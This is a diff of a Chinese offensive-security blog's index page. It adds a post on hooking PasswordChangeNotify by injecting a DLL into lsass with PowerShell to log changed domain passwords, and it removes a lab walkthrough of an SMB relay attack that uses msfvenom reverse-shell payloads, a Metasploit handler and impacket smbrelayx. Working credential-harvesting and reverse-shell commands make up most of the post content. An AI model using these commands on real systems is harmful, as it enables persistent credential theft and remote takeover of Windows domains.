@@ -319,6 +319,197 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/Hook-PasswordChangeNotify.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="VK">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Evil-404">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/Hook-PasswordChangeNotify.html" itemprop="url">维持域管权限的一些简单办法[ Hook PasswordChangeNotify ]</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-08-17T03:53:19+08:00">
+                2016-08-17
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2017-11-19T16:53:27+08:00">
+                2017-11-19
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/getdomain/" itemprop="url" rel="index">
+                    <span itemprop="name">getdomain</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  226
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><br><br>可利用 <code>Hook PasswordChangeNotify</code> 的方式,无需重启系统,且能实时记录修改的密码,只要目标机器不重启一般都不会失效,具体方法很简单,首先,准备好 <code>HookPasswordChange.dll</code> 和 <code>Invoke-ReflectivePEInjection.ps1</code> [主要是用它来把我们事先准备好的 HookPasswordChange.dll 注入到 <code>lsass</code> 进程中,这里有点类似劫持的意思],实际渗透中,并不一定非要把它记录在目标系统的本地文件中[记录到的密码默认放在c:\windows\temp\passwords.txt文件中],你也可以尝试直接把记录到的账号发送到远程指定的邮箱中[有人已提供改进过的dll],自己去谷歌找找,应该可以找到,下面是在本地测试的实际效果:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> powershell –<span class="built_in">exec</span> bypass –Command <span class="string">"&amp; &#123;Import-Module 'C:\Invoke-ReflectivePEInjection.ps1';Invoke-ReflectivePEInjection -PEPath C:\HookPasswordChange.dll –procname lsass&#125;"</span></span></span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/hook dll injection.png" alt=""></p>
+<p>实际的效果如下<br><img src="/img/hook dll injection record pass.png" alt=""><br><img src="/img/hook dll injection record pass fish.png" alt=""><br><img src="/img/hook dll injection record pass res.png" alt=""></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/powershell-domainhash.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2175,213 +2366,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/smb-replay-attack.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="VK">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Evil-404">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/smb-replay-attack.html" itemprop="url">smb重放攻击 [smb中间人]</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-07-20T23:45:22+08:00">
-                2016-07-20
-              </time>
-            
-
-            
-              <span class="post-meta-divider">|</span>
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-check-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">更新于&#58;</span>
-              
-              <time title="更新于" itemprop="dateModified" datetime="2017-11-17T09:43:37+08:00">
-                2017-11-17
-              </time>
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-
-            
-
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/smb-attack/" itemprop="url" rel="index">
-                    <span itemprop="name">smb attack</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  1,978
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  7
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><br><br>0x01 在演示smb重放攻击之前,我们还是需要先搞清楚ntlm的基本认证过程,因为smb登录基于这个,正常情况下,ntlm的简要认证详细流程如下:</p>
-<p><img src="/img/ntlm_auth.png" alt="ntlm认证过程"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client端  &lt;-----&gt;  server端</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>,正常情况,当client端登陆时需要先输入username,password和domain[默认是.,表示本地],之后client端会自己计算出password用DES加密后的hash,并将此hash暂时保存在本地</span><br><span class="line"><span class="number">2</span>,接着,client端会将自己的username明文发送给DC[server]</span><br><span class="line"><span class="number">3</span>,此时,DC会生成一组<span class="number">8</span>字节的随机数,也叫challenge[挑战码],返回给client端</span><br><span class="line"><span class="number">4</span>,当client端在收到这个挑战码以后,会把先把它拷贝一份出来,然后再拿着这个挑战码和之前已经加密的密码hash再进行一次加密,加密后的东西叫response[响应],最后再将challenge,response和username一并发送给server端</span><br><span class="line"><span class="number">5</span>,server端在接收到client端传过来的这个三个值以后会将它们分别都转发给DC</span><br><span class="line"><span class="number">6</span>,DC在接收到username,response,challenge以后,会根据传过来的username,到自己的账号数据库中去查出来这个username所对应的hash,然后,再拿着这个hash和刚刚传过来的challenge再进行一次加密</span><br><span class="line"><span class="number">7</span>,最后,就剩比对了,把客户端传过来的response和在[<span class="number">6</span>]中最后加密的hash值进行对比,如果一致,ok,认证通过,登录成功,反之,则登录失败</span><br></pre></td></tr></table></figure>
-<p>0x02 下面,我们就来简单再现一下smb的整个重放攻击过程:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client端  &lt;-----&gt; 攻击者 &lt;-----&gt;  server端</span><br></pre></td></tr></table></figure></p>
-<p>和上面的拓扑基本一致,只不过在此时,在client端和server端中间多了个攻击者,但双方在整个通信过程中都并不知道攻击者的存在,此时,我们本来正常的认证过程就变成了下面的样子:<br><img src="/img/SMBRelay-02.png" alt="重放过程"><br><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>,client端还是正常向服务端发送登录请求,由于client端此时并不知道攻击者的存在,它以为请求是发送给了server端,但实际上它是先发给了攻击者</span><br><span class="line"><span class="number">2</span>,然后攻击者再拿着这个username假装成client端发送给server端,此时server端正常返回一个challenge</span><br><span class="line"><span class="number">3</span>,攻击者拿到这个challenge以后再把它返回给client端</span><br><span class="line"><span class="number">4</span>,而client端拿到challenge在本地和自己的password DES加密以后,会把这个response再次发送给攻击者,此时client依然还以为攻击者就是server端</span><br><span class="line"><span class="number">5</span>,最后,攻击者会拿着client端发过来的这个response再把它交给server端去验证</span><br><span class="line"><span class="number">7</span>,server端此时到自己的数据库中一对比,发现hash一致,认证通过,登录成功,可见,一次简易的smb中间人攻击就这样被完成了</span><br></pre></td></tr></table></figure></p>
-<p>0x03 接着就来简单模拟下如何利用这种一攻击手法:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先,准备好三台机器,且在同一内网中,且已确保它们之间的通信没有任何问题</span><br><span class="line">受害者机器[win2008R2 en] 	<span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.125</span></span><br><span class="line">攻击者机器[ubuntu <span class="number">16.04</span> LTS en]  <span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.136</span></span><br><span class="line">第三方机器[win2008R2 cn] 	<span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.23</span></span><br></pre></td></tr></table></figure></p>
-<p>我们最终要达成的目的,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过smb重放攻击,获取目标机器(<span class="number">192.168</span>.<span class="number">3.125</span>)的meterpreter</span><br></pre></td></tr></table></figure></p>
-<p>在攻击者的机器上准备好下面的东西,生成并监听我们的马,下载安装impacket:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.136 LPORT=1234 -f exe -o /home/tools/shell.exe</span></span><br><span class="line">		</span><br><span class="line">msf  &gt; use exploit/multi/handler </span><br><span class="line">msf  &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf  &gt; set lport <span class="number">1234</span></span><br><span class="line">msf  &gt; set lhost <span class="number">192.168</span>.<span class="number">3.136</span></span><br><span class="line">msf  &gt; exploit -j</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pip install pycrypto   安装依赖的加密库</span></span><br><span class="line"><span class="comment"># apt-get --reinstall install python-pyasn1 python-pyasn1-modules</span></span><br><span class="line"><span class="comment"># git clone https://github.com/CoreSecurity/impacket.git</span></span><br><span class="line"><span class="comment"># chmod -R 755 impacket</span></span><br><span class="line"><span class="comment"># cd impacket/</span></span><br><span class="line"><span class="comment"># python setup.py install</span></span><br><span class="line"><span class="comment"># cd examples/</span></span><br><span class="line"><span class="comment"># python smbrelayx.py -h   </span></span><br><span class="line">  -h 指定要攻击的机器</span><br><span class="line">  -e 当认证成功以后,指定要执行的文件,一般都是我们事先准备好的马</span><br></pre></td></tr></table></figure>
-<p>在第三方机器上执行如下命令,向攻击者传送smb流量,注意,我这里的账号密码其实就是192.168.3.125正确的系统账号密码:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># net use \\192.168.3.136\c$ "lala!@#45" /user:"administrator"</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="/img/smbreplay_net_use.jpg" alt="往攻击机上执行net use"></p>
-<p>此时,当我们再回到攻击机上时就可以看到,当别人net use到攻击机上时,攻击者很轻易就捕捉到了smb 的登录凭证hash,然后,它又接着拿着这个hash到192.168.3.125[也就是我们的目标机器]去尝试登录,其实这就是所谓的重放,一旦登录成功,就会自动执行我们的马[类似我们用wmic远程执行代码]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python smbrelayx.py -h 192.168.3.125 -e /home/tools/shell.exe</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="/img/smbreplay_hash.jpg" alt="重放过程"></p>
-<p>可以看到,当我们重放登录成功,文件就会被正常执行,meterpreter亦被正常弹回<br><img src="/img/smbreplay_meterpreter.jpg" alt=""><br><img src="/img/smbreplay_system.jpg" alt=""><br><img src="/img/smbreplay_ipconfig.jpg" alt=""></p>
-<p>我们现在可以再试下,如果此时net use的密码不对,又会出现什么样的状况,很显然,下面的结果已经说的很清楚了,尝试在192.168.3.125上重放时失败了,原因也已经很清楚了,密码不对,马自然也就执行不了,因为根本没法wmic<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\<span class="number">192.168</span>.<span class="number">3.136</span>\c$ <span class="string">"a!@#45"</span> /<span class="symbol">user:</span><span class="string">"administrator"</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="/img/smbreplay_net_use_filai.jpg" alt=""><br><img src="/img/smbreplay_faiel.jpg" alt=""></p>
-<p><br></p>
-<p>过程中需要注意的一些点:<br>&nbsp;&nbsp;&nbsp;&nbsp;你可能一直在疑惑的是,受害者怎么会自己傻到<code>net use</code>到攻击者的机器上呢,没错,正常情况下肯定不会,如果想让同内网下别的机器上的流量流过自己,无非就是通过欺骗,因为smbrelayx本身并没有带类似的功能,所以,它并不能自动抓取内网中的所有smb流量,如果想让所有的流量都自动流过攻击者的机器,可能还需要配合Responder来一起实现,这里只是为了给大家看下攻击后的效果,所以,我的net use 就直接指向了攻击机,这样一来smb流量自然就能流过它[攻击机]了,当我们直接net use到攻击机时,其实我们的smb hash也会一并发送给它,然后脚本会拿着这个hash到目标机器上去认证,认证成功后即可执行我们的马,此时meterpreter正常弹回,如果认证失败,则不进行任何操作,注意,因为我这里只是测试,实际中你是几乎不可能指望别人直接net use到攻击机上的,还是那句话,这就需要你配合欺骗来一起利用,让所有的smb流量都经过你,然后抓取里面的登录凭证挨个到目标机器上去重放<br><br></p>
-<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;单从攻击的原理上来讲,其实非常简单,也并非什么新技术,类似的重放不仅仅适用于内网,web也同样适用,言辞比较粗糙,只是想把原理尽量跟大家说明白,既然已经有人帮我们实现了这样的脚本,我们就省的自己重复造轮子了,后期还会单独说明如何配合Responder全自动定向攻击特定内网机器,细心的朋友可能会发现,smb中间人,似乎跟,hash传递,票据窃取……都是非常类似的攻击手法,至于漏洞危害个人觉得还是比较大的,尤其是在windows内网中[比如域],因为它不是靠漏洞来攻击的,基于这个思路演变出来的攻击手法其实还有非常多,任何能产生smb登录的条件你甚至都可以利用,篇幅原因就先说到这里吧,个人理解可能比较有限,欢迎大家一起来深入讨论,始终坚信,抛砖才能引玉<br></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2436,7 +2420,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">161</span>
+                  <span class="site-state-item-count">162</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2447,7 +2431,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">114</span>
+                  <span class="site-state-item-count">115</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -2458,7 +2442,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">109</span>
+                  <span class="site-state-item-count">110</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -2598,7 +2582,7 @@ show_date_time();
         <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
 </script>
 
-<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
@@ -2606,7 +2590,7 @@ show_date_time();
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共309.1k字</span>
+  <span class="post-count">博客全站共310.0k字</span>
 </div>
 
   
